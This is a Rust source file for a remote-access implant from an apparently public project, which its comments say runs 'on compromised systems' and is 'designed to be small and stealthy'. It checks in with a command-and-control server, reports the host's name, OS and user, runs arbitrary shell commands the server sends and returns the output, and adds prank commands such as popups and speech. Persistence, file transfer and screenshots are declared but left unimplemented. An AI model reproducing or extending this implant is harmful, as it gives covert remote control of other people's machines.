/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! Implant binary - runs on compromised systems.
//!
//! This is a standalone executable that connects to the C2 server,
//! receives commands, and executes them. It's designed to be small
//! and stealthy.
//!
//! # Configuration
//!
//! Edit these constants before compiling for your target:

// === CONFIGURATION ===
// Edit these values before building the implant!

/// C2 server URL - where the implant should connect
const C2_URL: &str = "http://localhost:8080";

/// How often to check in with the C2 (seconds)
const SLEEP_INTERVAL: u64 = 30;

// === END CONFIGURATION ===

// Note: We include the necessary modules inline to keep the implant
// as a single, self-contained binary.

use chrono::Utc;
use hostname;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::env;
use std::process::Command as ProcessCommand;
use std::time::Duration;
use uuid::Uuid;

// Simplified protocol types (duplicated to keep implant standalone)

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ImplantInfo {
    id: String,
    hostname: String,
    os: String,
    username: String,
    ip: String,
    first_seen: chrono::DateTime<Utc>,
    last_seen: chrono::DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CheckinRequest {
    info: ImplantInfo,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CheckinResponse {
    commands: Vec<ServerCommand>,
    sleep_interval: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ServerCommand {
    id: String,
    implant_id: String,
    command: CommandType,
    created_at: chrono::DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", content = "args")]
enum CommandType {
    Exec { cmd: String },
    Upload { remote_path: String, data: String },
    Download { remote_path: String },
    Screenshot,
    SysInfo,
    Persist,
    Uninstall,
    Rickroll,
    Wallpaper { image_url: String },
    Speak { message: String },
    Popup { message: String, count: u32 },
    MouseChaos { duration_secs: u32 },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CommandResult {
    command_id: String,
    implant_id: String,
    success: bool,
    output: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    data: Option<String>,
    timestamp: chrono::DateTime<Utc>,
}

/// Main implant loop.
///
/// 1. Gather system info
/// 2. Check in with C2
/// 3. Execute any received commands
/// 4. Send results
/// 5. Sleep and repeat
#[tokio::main]
async fn main() {
    // Generate unique implant ID
    let implant_id = Uuid::new_v4().to_string();

    // Gather system information
    let info = gather_info(implant_id.clone());

    // Create HTTP client
    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .expect("Failed to create HTTP client");

    let mut sleep_interval = SLEEP_INTERVAL;

    // Main loop
    loop {
        // Check in with C2
        match checkin(&client, &info).await {
            Ok(response) => {
                // Update sleep interval if server says so
                sleep_interval = response.sleep_interval;

                // Execute each command
                for cmd in response.commands {
                    let result = execute_command(&cmd);

                    // Send result back
                    let _ = send_result(&client, result).await;
                }
            }
            Err(_) => {
                // Connection failed - just keep trying
            }
        }

        // Sleep before next check-in
        tokio::time::sleep(Duration::from_secs(sleep_interval)).await;
    }
}

/// Gathers information about the current system.
fn gather_info(id: String) -> ImplantInfo {
    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_default();

    let os = format!("{} {}", env::consts::OS, env::consts::ARCH);

    let username = env::var("USER")
        .or_else(|_| env::var("USERNAME"))
        .unwrap_or_default();

    let now = Utc::now();

    ImplantInfo {
        id,
        hostname,
        os,
        username,
        ip: String::new(),
        first_seen: now,
        last_seen: now,
    }
}

/// Checks in with the C2 server.
async fn checkin(client: &Client, info: &ImplantInfo) -> Result<CheckinResponse, reqwest::Error> {
    let url = format!("{}/api/checkin", C2_URL);
    let request = CheckinRequest { info: info.clone() };

    client
        .post(&url)
        .json(&request)
        .send()
        .await?
        .json()
        .await
}

/// Sends a command result to the C2 server.
async fn send_result(client: &Client, result: CommandResult) -> Result<(), reqwest::Error> {
    let url = format!("{}/api/result", C2_URL);
    client.post(&url).json(&result).send().await?;
    Ok(())
}

/// Executes a command and returns the result.
fn execute_command(cmd: &ServerCommand) -> CommandResult {
    let (success, output, data) = match &cmd.command {
        CommandType::Exec { cmd: shell_cmd } => {
            match execute_shell(shell_cmd) {
                Ok(out) => (true, out, None),
                Err(e) => (false, e, None),
            }
        }

        CommandType::Rickroll => {
            match open::that("https://www.youtube.com/watch?v=dQw4w9WgXcQ") {
                Ok(_) => (true, "Never gonna give you up!".to_string(), None),
                Err(e) => (false, format!("Failed: {}", e), None),
            }
        }

        CommandType::Speak { message } => {
            match speak_message(message) {
                Ok(_) => (true, format!("Spoke: {}", message), None),
                Err(e) => (false, e, None),
            }
        }

        CommandType::Popup { message, count } => {
            show_popups(message, *count);
            (true, format!("Showed {} popups", count), None)
        }

        // TODO: Implement remaining commands
        _ => (false, "Command not implemented".to_string(), None),
    };

    CommandResult {
        command_id: cmd.id.clone(),
        implant_id: cmd.implant_id.clone(),
        success,
        output,
        data,
        timestamp: Utc::now(),
    }
}

/// Executes a shell command.
fn execute_shell(cmd: &str) -> Result<String, String> {
    let output = if cfg!(target_os = "windows") {
        ProcessCommand::new("cmd").args(["/C", cmd]).output()
    } else {
        ProcessCommand::new("sh").args(["-c", cmd]).output()
    };

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            Ok(format!("{}{}", stdout, stderr))
        }
        Err(e) => Err(format!("Failed: {}", e)),
    }
}

/// Speaks a message using TTS.
fn speak_message(message: &str) -> Result<(), String> {
    #[cfg(target_os = "linux")]
    {
        ProcessCommand::new("espeak")
            .arg(message)
            .output()
            .map_err(|e| format!("{}", e))?;
    }

    #[cfg(target_os = "macos")]
    {
        ProcessCommand::new("say")
            .arg(message)
            .output()
            .map_err(|e| format!("{}", e))?;
    }

    #[cfg(target_os = "windows")]
    {
        let script = format!(
            "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{}')",
            message.replace('\'', "''")
        );
        ProcessCommand::new("powershell")
            .args(["-Command", &script])
            .output()
            .map_err(|e| format!("{}", e))?;
    }

    Ok(())
}

/// Shows popup message boxes.
fn show_popups(message: &str, count: u32) {
    for _ in 0..count {
        #[cfg(target_os = "linux")]
        {
            let _ = ProcessCommand::new("zenity")
                .args(["--info", "--text", message])
                .spawn();
        }

        #[cfg(target_os = "macos")]
        {
            let script = format!("display dialog \"{}\" buttons {{\"OK\"}}", message);
            let _ = ProcessCommand::new("osascript")
                .args(["-e", &script])
                .spawn();
        }

        #[cfg(target_os = "windows")]
        {
            let script = format!(
                "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('{}')",
                message.replace('\'', "''")
            );
            let _ = ProcessCommand::new("powershell")
                .args(["-Command", &script])
                .spawn();
        }

        std::thread::sleep(Duration::from_millis(300));
    }
}
